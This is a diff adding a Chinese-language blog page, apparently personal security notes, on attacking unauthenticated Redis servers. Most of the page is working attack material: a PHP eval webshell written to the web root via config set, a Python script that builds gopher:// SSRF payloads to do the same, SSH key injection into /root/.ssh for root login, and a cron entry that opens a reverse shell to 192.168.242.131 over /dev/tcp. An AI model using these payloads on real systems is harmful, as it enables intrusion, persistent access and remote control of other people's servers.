@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>redis的一些攻击方式 - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "redis\u7684\u4e00\u4e9b\u653b\u51fb\u65b9\u5f0f", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "RESP\u534f\u8bae", url: "#resp" },
+              {title: "gopher\u534f\u8bae", url: "#gopher" },
+              {title: "\u5982\u4f55redis\u8fdc\u7a0b\u94fe\u63a5", url: "#redis_1" },
+              {title: "\u653b\u51fb\u65b9\u6cd5\u4e00:\u5199shell", url: "#shell" },
+              {title: "\u653b\u51fb\u65b9\u6cd5\u4e8c:info\u83b7\u53d6\u654f\u611f\u4fe1\u606f", url: "#info" },
+              {title: "\u653b\u51fb\u65b9\u6cd5\u4e09\uff1a\u5199\u5165ssh\u516c\u94a5", url: "#ssh" },
+              {title: "\u653b\u51fb\u65b9\u6cd5\u56db\uff1a\u5229\u7528cron\u8ba1\u5212\u4efb\u52a1\u53cd\u5f39shell", url: "#cronshell" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        sql注入
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../minio/minio/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../minio/minio/" class="btn btn-xs btn-link">
+        minio
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="redis">redis的一些攻击方式</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#RESP协议">RESP协议</a></li>
+<li><a href="#gopher协议">gopher协议</a></li>
+<li><a href="#如何redis远程链接">如何redis远程链接</a></li>
+<li><a href="#攻击方法一写shell">攻击方法一:写shell</a></li>
+<li><a href="#攻击方法二info获取敏感信息">攻击方法二:info获取敏感信息</a></li>
+<li><a href="#攻击方法三写入ssh公钥">攻击方法三：写入ssh公钥</a></li>
+<li><a href="#攻击方法四利用cron计划任务反弹shell">攻击方法四：利用cron计划任务反弹shell</a></li>
+</ul>
+<hr />
+<p>参考 <a href="https://www.redteaming.top/2019/07/15/浅析Redis中SSRF的利用/" title="https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/">https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/</a></p>
+<p>Redis默认端口6379
+如果存在未授权问题，那么任何人都可以往这台Redis服务器上传输命令</p>
+<p>一般Redis攻击有
+写shell（最常用），写密钥，写crontab反弹shell, info获得敏感信息,其中写密钥和写crontab不是那么的好用</p>
+<p>在讲攻击之前，要讲一下RESP协议</p>
+<h2 id="resp">RESP协议</h2>
+<p>Redis服务器与客户端通过RESP协议的通信。
+resp协议从redis1.2引入。
+这个协议把服务器与客户端之间的数据以一种序列化的形式处理并传输</p>
+<p>在RESP中，某些数据的类型取决于第一个字节：
+对于<code>Simple Strings</code>，回复的第一个字节是<code>+</code>
+对于<code>error</code>，回复的第一个字节是<code>-</code>
+对于<code>Integer</code>，回复的第一个字节是<code>:</code>
+对于<code>Bulk Strings</code>，回复的第一个字节是<code>$</code>，发送给服务器的命令就是放在数组中的BulkStrings类型
+对于<code>array</code>，回复的第一个字节是<code>*</code>
+此外，<code>RESP</code>能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值。
+在RESP中，协议的不同部分始终以<code>"\r\n"(CRLF)</code>结束。</p>
+<p>同时每个类型字节后紧跟着该类型的长度，然后是CRLF，然后是该类型的值</p>
+<p>说了这么多，肯定不会很懂，上图</p>
+<p><img alt="QQ截图20210219143000" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219143000.png" title="QQ截图20210219143000" /></p>
+<p>即发送的时候，是用三个元素的数组(*3),第一个元素是三个长度的BulkString($3)其值为set,第二个元素是四个长度的BulkSting($4)其值为name,第三个元素是四个长度长的BulkString(\$4)其值为test,服务器返回SimpleString（+）OK，以下类推</p>
+<h2 id="gopher">gopher协议</h2>
+<p>是http协议出现常用的一个协议，SSRF的万金油。</p>
+<p>格式：gopher://IP:port/ _{TCP/IP数据流}</p>
+<h2 id="redis_1">如何redis远程链接</h2>
+<pre><code class="language-纯文本">redis-cli -h ip -p port
+xxx.xxx.xxx.xxx:x&gt;AUTH &quot;password&quot;  (未授权就不需要输入密码)
+</code></pre>
+<h2 id="shell">攻击方法一:写shell</h2>
+<p>写shell的话,redis需执行的命令应该类似这样</p>
+<pre><code class="language-纯文本">如果你能直接redis -h ip -n 6379  未授权连接上redis服务器且权限够高，可以直接输入以下命令
+flushall  //清空数据库
+set 1 '&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;'   //为键名为1的键赋值
+config set dir /var/www/html
+config set dbfilename shell.php     //设置数据存储到磁盘时的文件路径
+save    //数据库全部保存至磁盘
+</code></pre>
+<p>攻击脚本如下(主要用于ssrf)</p>
+<pre><code class="language-纯文本">#python3
+import urllib
+protocol=&quot;gopher://&quot;
+ip=&quot;192.168.163.128&quot;
+port=&quot;6379&quot;
+shell=&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;
+filename=&quot;shell.php&quot;
+path=&quot;/var/www/html&quot;
+passwd=&quot;&quot;
+cmd=[&quot;flushall&quot;,
+   &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),//这里的IFS替换不是很理解是啥意思..
+   &quot;config set dir {}&quot;.format(path),
+   &quot;config set dbfilename {}&quot;.format(filename),
+   &quot;save&quot;
+   ]
+if passwd:
+  cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))   //如果需要密码，就把密码输入命令加入到cmd第一位
+payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
+def redis_format(arr):
+  CRLF=&quot;\r\n&quot;
+  redis_arr = arr.split(&quot; &quot;)
+  cmd=&quot;&quot;
+  cmd+=&quot;*&quot;+str(len(redis_arr))
+  for x in redis_arr:
+    cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
+  cmd+=CRLF
+  return cmd
+
+if __name__==&quot;__main__&quot;:
+  for x in cmd:
+    payload += urllib.quote(redis_format(x))
+  print(payload)
+</code></pre>
+<p>这样的话，我们就得到了payload，直接curl一下，就写入shell了</p>
+<h2 id="info">攻击方法二:info获取敏感信息</h2>
+<p>连上后 使用info命令</p>
+<p><img alt="QQ截图20210219143019" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219143019.png" title="QQ截图20210219143019" /></p>
+<h2 id="ssh">攻击方法三：写入ssh公钥</h2>
+<p>高版本不好用，因为高版本的redis权限是无法往/root目录写入的.
+而这个方法则需要往/root/.ssh写入ssh公钥达到无密码ssh链接的目的</p>
+<p>首先在攻击机上生成一对不需要密码的公钥私钥</p>
+<p><img alt="QQ截图20210219143031" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219143031.png" title="QQ截图20210219143031" /></p>
+<p><img alt="QQ截图20210219143103" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219143103.png" title="QQ截图20210219143103" /></p>
+<p>然后依次输入</p>
+<pre><code class="language-纯文本">config set dir /root/.ssh
+config set dirfilename authorized_keys
+save
+</code></pre>
+<p>然后ssh免密登录 ssh -i id_rsa root\@ip</p>
+<h2 id="cronshell">攻击方法四：利用cron计划任务反弹shell</h2>
+<p>仅在centos系统奏效，Ubuntu不行</p>
+<ol>
+<li>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/</code>权限644也能执行</li>
+<li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li>
+</ol>
+<p>由于系统的不同，crontrab定时文件位置也会不同
+Centos的定时任务文件在<code>/var/spool/cron/</code>
+Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/</code>
+Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> PS：高版本的redis默认启动是<code>redis</code>权限，故写这个文件是行不通的</p>
+<pre><code class="language-纯文本">命令如下
+set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.242.131/888 0&gt;&amp;1\n&quot;
+config set dir /var/spool/cron/
+config set dbfilename root
+save
+</code></pre>
+<p>把上面那个脚本改改就能实现ssrf了</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        sql注入
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../minio/minio/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../minio/minio/" class="btn btn-xs btn-link">
+        minio
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
